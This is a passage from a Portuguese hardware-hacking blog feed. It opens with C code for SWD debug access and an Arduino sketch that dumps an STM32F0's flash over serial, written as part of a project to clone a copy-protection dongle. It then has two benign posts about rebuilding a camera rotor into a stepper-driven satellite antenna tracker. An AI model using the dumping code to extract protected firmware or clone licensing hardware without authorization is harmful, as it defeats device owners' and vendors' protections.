    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">data</span> <span class="o">=</span> <span class="mh">0x00000000u</span><span class="p">;</span>

    <span class="n">data</span> <span class="o">|=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">ap</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">24u</span><span class="p">;</span>
    <span class="n">data</span> <span class="o">|=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">bank</span> <span class="o">&amp;</span> <span class="mh">0x0Fu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="cm">/* write to select register */</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x02u</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadAP0</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdSetAP32BitMode</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">swdSelectAPnBank</span><span class="p">(</span><span class="mh">0x00u</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">);</span>

    <span class="kt">uint32_t</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadAP0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="n">d</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x07u</span><span class="p">);</span>
    <span class="n">d</span> <span class="o">|=</span> <span class="mh">0x02u</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">d</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadAP0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdSelectAHBAP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdSelectAPnBank</span><span class="p">(</span><span class="mh">0x00u</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdReadAHBAddr</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x01u</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdEnableDebugIF</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x01u</span><span class="p">,</span> <span class="mh">0x50000000u</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdInit</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">idcode</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">swdReset</span><span class="p">();</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadIdcode</span><span class="p">(</span><span class="n">idcode</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="maincpp">main.cpp</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">&lt;Arduino.h&gt;</span><span class="cp">
</span>
<span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>
    <span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
</span>    <span class="cp">#include</span> <span class="cpf">"reader.h"</span><span class="cp">
</span><span class="p">}</span>

<span class="c1">// STM32 target flash memory size in bytes</span>
<span class="kt">uint32_t</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">32768</span><span class="p">;</span>

<span class="c1">// Usually the STM32F0x starts here.</span>
<span class="c1">// If you're trying to dump another series check the datasheet.</span>
<span class="kt">uint32_t</span> <span class="n">flashAddress</span> <span class="o">=</span> <span class="mh">0x08000000</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">status</span><span class="p">;</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>

    <span class="n">pinMode</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>

    <span class="n">targetInit</span><span class="p">();</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">Serial</span><span class="p">.</span><span class="n">available</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Send anything to start..."</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Starting"</span><span class="p">);</span>

    <span class="kt">uint32_t</span> <span class="n">flashData</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">flashData</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">status</span> <span class="o">=</span> <span class="n">extractFlashData</span><span class="p">(</span><span class="n">flashAddress</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flashData</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">!=</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">Serial</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"Error reading: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"%08x: %08x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">flashAddress</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">flashData</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"DONE"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{}</span>
</code></pre></div></div>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Hardware Hacking" /><category term="Protected Firmware" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="STM32" /><category term="Patreon" /><category term="MCU" /><summary type="html"><![CDATA[No processo do meu hobby de hackear hardware, encontrei um clone chinês de um dongle HASP HL equipado com um processador STM32F042G6U6. Minha intenção era cloná-lo, e durante minha exploração, descobri quatro pinos da interface de depuração SWD localizados na parte inferior da PCB. Soldei um conector de 4 pinos nesses pinos para facilitar o acesso.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/patreon/Pasted%20image%2020230124035811.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/patreon/Pasted%20image%2020230124035811.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Rotor de Antena - Parte 2</title><link href="https://lucasteske.dev/2021/04/rotor-antenna-parte-2" rel="alternate" type="text/html" title="Rotor de Antena - Parte 2" /><published>2021-04-01T05:23:00+00:00</published><updated>2021-04-01T05:23:00+00:00</updated><id>https://lucasteske.dev/2021/04/rotor-antenna-parte-2</id><content type="html" xml:base="https://lucasteske.dev/2021/04/rotor-antenna-parte-2"><![CDATA[<p>Continuando o projeto do tracker, consegui alguns progressos significativos. Assim como o Demilson (PY2UEP) tinha cortado os motores originais, fiz o mesmo. O motor do azimute estava bem enferrujado e acabei estragando uma de suas bobinas (queria reaproveitar o fio), mas no fim o eixo saiu.</p>

<hr />

<p>Após o eixo removido, quebrei o imã com um martelo até que não sobrasse mais pedaços de imã no eixo, desta maneira restando apenas o suporte sextavado de onde era preso o imã.</p>

<p><img src="/assets/posts/tracker-mount-2/azimuth-motor-shaft.jpg" alt="Suporte Sextavado do Imã 1" />
<img src="/assets/posts/tracker-mount-2/azimuth-motor-shaft2.jpg" alt="Suporte Sextavado do Imã 2" />
<img src="/assets/posts/tracker-mount-2/azimuth-motor-shaft3.jpg" alt="Suporte Sextavado do Imã 3" /><em>Eixo do motor do azimute mostrando o suporte sextavado do imã</em></p>

<p>Já para o motor da elevação, fiz um corte lateral no motor bem em uma marca circular que tem próximo a saída do motor. Desse jeito poderia usar o mesmo suporte e eixos do motor original para melhor acoplamento com o redutor.</p>

<p><img src="/assets/posts/tracker-mount-2/elevation-shaft-support.jpg" alt="&quot;tampa&quot; do motor de elevação cortado" /><em>“tampa” do motor de elevação cortado</em>
<img src="/assets/posts/tracker-mount-2/elevation-shaft-support-with-reduction.jpg" alt="Tampa + Redutor" /><em>Tampa + Redutor</em>
<img src="/assets/posts/tracker-mount-2/elevation-motor-parts2.jpg" alt="Peças do motor" /><em>Peças do Motor</em></p>

<p>Para a elevação, foi nescessário cortar o do motor original e fazer um “vinco” na lateral dele para encaixar melhor na peça que seria impressa em 3D. Para fazer isso, coloquei o eixo original entre duas madeiras (por sugestão do meu pai) e efetuamos o corte do eixo. Para os vincos, usamos a esmerilhadeira.</p>

<p><img src="/assets/posts/tracker-mount-2/elevation-shaft-cut.jpg" alt="Eixo cortado no meio de duas madeiras" /><em>Eixo cortado no meio de duas madeiras</em>
<img src="/assets/posts/tracker-mount-2/elevation-shaft-support-with-shaft.jpg" alt="Eixo cortado na tampa do motor" /><em>Eixo cortado na tampa do motor</em></p>

<p>Com isso eu poderia, então, começar os desenhos em 3D para as adaptações.</p>

<h2 id="impressões-3d">Impressões 3D</h2>

<p>Depois de muita tentativa e erro, consegui acertar os encaixes entre os eixos. Porém percebi um problema: O espaço para o motor do azimute estava <strong>extremamente</strong> limitado, a ponto de meus motores NEMA 17 de 40mm serem grandes demais para o espaço.</p>

<p><img src="/assets/posts/tracker-mount-2/try-azimuth-44adapter.jpg" alt="Adaptação para Azimute" />
<img src="/assets/posts/tracker-mount-2/try-azimuth-44adapter-place.jpg" alt="Adaptação para Azimute" /><em>Adaptação para Azimute</em></p>

<p>Para isso tive que comprar motores “slim” para o local. Fiquei um pouco preocupado com torque, mas minhas tentativas de fazer com engrenagens e tudo mais foram por água abaixo. Os motores em questão foram comprados a Aliexpress (confira no fim do post pelos links)</p>

<p>Enquanto o motor não chegava, fiquei otimizando os adaptadores para serem os mais curtos possíveis, economizando todo espaço possível. Eu uso o <a href="https://www.freecadweb.org/">FreeCAD</a> por ser gratuito e também onde eu sei mexer melhor. Porém não assuma que eu realmente sou um designer 3D, pois eu não sou. As peças são apenas “funcionais”.</p>

<p><img src="/assets/posts/tracker-mount-2/azimuth-shaft-adapter.jpg" alt="Adaptador de eixo do azimute" /><em>Adaptador de eixo do azimute</em>
<img src="/assets/posts/tracker-mount-2/azimuth-support.jpg" alt="Suporte do azimute" /><em>Suporte do azimute</em>
<img src="/assets/posts/tracker-mount-2/elevation-shaft-adapter.jpg" alt="Adaptador de eixo da elevação" /><em>Adaptador de eixo da elevação</em>
<img src="/assets/posts/tracker-mount-2/elevation-motor-adapter.jpg" alt="Suporte da elevação" /><em>Suporte da elevação</em>
<img src="/assets/posts/tracker-mount-2/exploded-elevation-shaft.jpg" alt="" /></p>

<p>E o primeiro eixo a funcionar foi o da elevação. Para isso usei motores de 40 mm NEMA17 (link no fim do post), que de fabrica eram closed-loop (com encoder magnético) porém acabei usando drivers TMC2209 por serem mais práticos e silenciosos.</p>

<p><img src="https://www.youtube.com/watch?v=cfUtCqb3oxA" alt="" />
<img src="https://www.youtube.com/watch?v=ENTpTZaiXl4" alt="" /></p>

<p>Após a chegada dos novos motores para o azimute, tratei de logo montar tudo e ver se ia caber. E coube!</p>

<p><img src="/assets/posts/tracker-mount-2/assembled-azimuth-support.jpg" alt="Azimute" />
<img src="/assets/posts/tracker-mount-2/azimuth-motor-inplace.jpg" alt="Motor de Azimute no lugar" /></p>

<p>E também funcionando!</p>

<p><img src="https://www.youtube.com/watch?v=-4U-ofHaF0E" alt="" /></p>

<p>Após tudo funcionando, fiz os testes para saber a resolução final e redução de ambos eixos. Para isso usei este codigo para o ESP32 controlar o TMC2209 e o meu celular preso ao eixo da elevação para medições de angulo.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;TMCStepper.h&gt;</span><span class="cp">
</span>
<span class="cp">#define STEP_PIN         12 // Step
#define EN_PIN           23 // Enable
</span>
<span class="cp">#define SERIAL_PORT Serial2 // TMC2208/TMC2224 HardwareSerial port
#define DRIVER_ADDRESS 0b00 // TMC2209 Driver address according to MS1 and MS2
</span>
<span class="cp">#define R_SENSE 0.11f 
</span>
<span class="n">TMC2209Stepper</span> <span class="nf">driver</span><span class="p">(</span><span class="o">&amp;</span><span class="n">SERIAL_PORT</span><span class="p">,</span> <span class="n">R_SENSE</span><span class="p">,</span> <span class="n">DRIVER_ADDRESS</span><span class="p">);</span>

<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">pinMode</span><span class="p">(</span><span class="n">STEP_PIN</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
  <span class="n">pinMode</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
  
  <span class="n">SERIAL_PORT</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>      <span class="c1">// HW UART drivers</span>
  <span class="n">Serial</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>

  <span class="n">driver</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>                 <span class="c1">// UART: Init SW UART (if selected) with default 115200 baudrate</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">toff</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>                <span class="c1">// Enables driver in software</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">rms_current</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>       <span class="c1">// Set motor RMS current</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">microsteps</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>           <span class="c1">// Set microsteps to 1/16th</span>

  <span class="n">driver</span><span class="p">.</span><span class="n">en_spreadCycle</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>    <span class="c1">// Toggle spreadCycle on TMC2208/2209/2224</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">pwm_autoscale</span><span class="p">(</span><span class="nb">true</span><span class="p">);</span>      <span class="c1">// Needed for stealthChop</span>

  <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"OK"</span><span class="p">);</span>
  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">bool</span> <span class="n">shaft</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{</span>
<span class="c1">//  Serial.println("TURN");</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">Serial</span><span class="p">.</span><span class="n">available</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">z</span> <span class="o">=</span> <span class="n">Serial</span><span class="p">.</span><span class="n">read</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">z</span> <span class="o">==</span> <span class="sc">'a'</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Stepping 10000"</span><span class="p">);</span>
      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
      <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">10000</span><span class="p">;</span> <span class="n">i</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">STEP_PIN</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">delayMicroseconds</span><span class="p">(</span><span class="mi">350</span><span class="p">);</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">STEP_PIN</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">delayMicroseconds</span><span class="p">(</span><span class="mi">350</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">z</span> <span class="o">==</span> <span class="sc">'b'</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">shaft</span> <span class="o">=</span> <span class="o">!</span><span class="n">shaft</span><span class="p">;</span>
      <span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"Shaft direction: "</span><span class="p">);</span>
      <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">shaft</span><span class="p">);</span>
      <span class="n">driver</span><span class="p">.</span><span class="n">shaft</span><span class="p">(</span><span class="n">shaft</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Os resultados foram:</p>

<ul>
  <li>Eixo Elevação
    <ul>
      <li>Redução aproximada: 1:3500</li>
      <li>Resolução Angular: 0,000117 graus / passo</li>
      <li>Velocidade Máxima: 0,62 graus / segundo</li>
    </ul>
  </li>
  <li>Eixo Azimute
    <ul>
      <li>Redução aproximada: 1:392</li>
      <li>Resolução Angular: 0,0046 graus / passo</li>
      <li>Velocidade Máxima: 6,3 graus / segundo</li>
    </ul>
  </li>
</ul>

<p>Os resultados parecem bem promissores, e caso tudo dê certo, será suficiente para rastreamento de satélites!</p>

<p>O próximo passo será montar o software e o hardware para controlar via rede!</p>

<p>Os modelos 3D (tanto Freecad quanto STL) estão disponíveis no Thingverse (ver seção de links)</p>

<h2 id="links">Links</h2>

<ul>
  <li><a href="https://s.click.aliexpress.com/e/_AOhCSe">Motor para Azimute</a></li>
  <li><a href="https://s.click.aliexpress.com/e/_ADtVZs">Motor para Elevação (Closed-Loop)</a></li>
  <li><a href="https://s.click.aliexpress.com/e/_9zgziK">Motor para Elevação (Normal)</a></li>
  <li><a href="https://s.click.aliexpress.com/e/_AoG3ZC">Drivers TMC2209</a></li>
  <li><a href="https://www.thingiverse.com/thing:4813288">Arquivos STL / Freecad</a></li>
</ul>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Airspy" /><category term="EMWIN" /><category term="GOES" /><category term="Hearsat" /><category term="LRIT" /><category term="RE" /><category term="Reverse Engineering" /><category term="Sat" /><category term="Satellite" /><category term="SDR" /><summary type="html"><![CDATA[Continuando o projeto do tracker, consegui alguns progressos significativos. Assim como o Demilson (PY2UEP) tinha cortado os motores originais, fiz o mesmo. O motor do azimute estava bem enferrujado e acabei estragando uma de suas bobinas (queria reaproveitar o fio), mas no fim o eixo saiu.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/tracker-mount-2/assembled-elevation-shaft.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/tracker-mount-2/assembled-elevation-shaft.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Rotor de Antena - Parte 1</title><link href="https://lucasteske.dev/2021/03/rotor-antenna-parte-1" rel="alternate" type="text/html" title="Rotor de Antena - Parte 1" /><published>2021-03-03T23:57:00+00:00</published><updated>2021-03-03T23:57:00+00:00</updated><id>https://lucasteske.dev/2021/03/rotor-antenna-parte-1</id><content type="html" xml:base="https://lucasteske.dev/2021/03/rotor-antenna-parte-1"><![CDATA[<p>A uns anos atrás eu comprei um rotor para câmera da Pelco, modelo PT175-24P. Esse rotor é feito para carregar uma câmera com lente de até 8kg, e contém dois motores bifásicos reversiveis internamente. Minha ideia era (e é) colocar uma parabólica acoplada, e controlar seu movimento para rastrear satélites. Assim eu poderia executar a recepção de satélites de baixa órbita.</p>

<p><img src="/assets/posts/tracker-mount/motor-schematic.jpg" alt="Esquema Interno" /><em>Esquema Interno</em></p>

<hr />

<p>O problema do sistema original da pelco, é que são dois motores de 24V AC, o que torna um VFD (Variable Frequency Driver) nescessário para controlar a velocidade e um sistema de loop fechado com algum sensor de angulo. Isso torna um pouco complexo o controle preciso da antena, então um colega (PY2UEP) sugeriu fazer uma modificação para trocar os motores por motor de passo. A grande vantagem dos motores de passo é que seus passos são sempre de mesmo comprimento. Logo se o motor der N passos em um sentido, e N passos no sentido contrário, ele irá retornar <strong>exatamente</strong> a mesma posição. Isso permite o uso de circuitos abertos (onde apenas no começo você move tudo para a posicao de referencia, e depois você não usa o feedback para corrigir nada).</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_20-56-30.jpg" alt="Motor de Passo" /><em>Motor de Passo</em></p>

<h1 id="fazendo-a-limpeza">Fazendo a limpeza</h1>

<p>Comecei então por abrir o rotor e fazer uma super limpeza. Limpar toda graxa antiga e tudo mais.</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-02_20-19-46.jpg" alt="Interior da Pelco" /><em>Interior da Pelco</em>
<img src="/assets/posts/tracker-mount/photo_2021-03-02_20-19-46-2.jpg" alt="Interior da Pelco" /><em>Interior da Pelco</em></p>

<p>Desmontei tudo, e dei um belo banho de querosene para remover a graxa. Os dois rolamentos do azimute estavam bem travados (a graxa secou tanto que parecia cola) então deixei de um dia pro outro na querosene e depois limpei com um pincel. Após toda limpeza, os rolamentos parecem novos!</p>

<p><img src="https://www.youtube.com/watch?v=9Y2FpSlNss8" alt="" /></p>

<p>O resto das peças eu joguei praticamente tudo dentro de um balde e enchi de querosene com um pouco de água. Depois fiquei mexendo as peças dentro (como são todas de metal bem resistente) “girando” o balde, como se eu estivesse misturando com uma colher. Após um tempo assim, deixei um tempo decantar e depois fiz varias lavagens com água e detergente pra remover toda querosene.</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_19-23-52.jpg" alt="Balde com peças" /><em>Balde com peças lavadas</em></p>

<p>As correias eu também deixei de molho na querosene e depois usei um pincel para tirar os pedaços encrustrados de graxa.</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_19-23-53.jpg" alt="Correias" /><em>Correias na querosene</em></p>

<p>Após tudo limpo, comecei a montagem colocando os dois rolamentos do azimute no lugar. O da parte inferior é preso no interior da pessa sob pressão, por isso foi nescessário o uso de um martelo. Com cuidado e um guia fui empurrando a peça até ficar praticamente rente com a parte de baixo. Após isso fiz a montagem do suporte do azimute.</p>

<p><img src="https://www.youtube.com/watch?v=5wpSKRn5RnM" alt="" /></p>

<p>E logo após coloquei o redutor e a correia do azimute no lugar.</p>

<p><img src="https://www.youtube.com/watch?v=bE6B3GejGmA" alt="" /></p>

<p>Depois foram coisas mais faceis: parafusar tudo novamente. No fim, eu deixei aberto para que pudesse planejar os motores de passo:</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_22-51-36.jpg" alt="Montagem da Pelco Aberta" /><em>Montagem da Pelco aberta</em></p>

<p>Próximo passo é desmontar os motores originais para adaptar o eixo aos motores de passo!</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_22-56-26-2.jpg" alt="Motor do Azimute" /><em>Motor do Azimute</em></p>

